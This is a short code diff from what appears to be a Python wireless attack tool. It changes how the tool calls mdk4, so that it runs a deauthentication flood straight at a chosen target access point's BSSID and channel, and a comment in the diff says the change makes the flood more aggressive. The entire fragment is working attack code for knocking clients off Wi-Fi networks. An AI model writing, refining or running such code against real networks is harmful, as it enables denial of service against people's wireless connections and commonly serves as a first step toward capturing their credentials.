@@ -1415,9 +1415,12 @@ log-async
             try:
                 clients = list(self.clients)
 
-                if tool == "mdk4" and mdk_file_ok:
+                if tool == "mdk4":
+                    # mdk4 4.x: target the AP directly with -B instead of the
+                    # mdk3-era "-b <blacklist file>" (which only reacts to data
+                    # traffic). -B actively floods deauth at the BSSID.
                     r = subprocess.run(
-                        ["mdk4", iface, "d", "-b", DEAUTH_BSSID_FILE,
+                        ["mdk4", iface, "d", "-B", self.target_bssid,
                          "-c", str(self.target_channel)],
                         capture_output=True, text=True, timeout=3
                     )
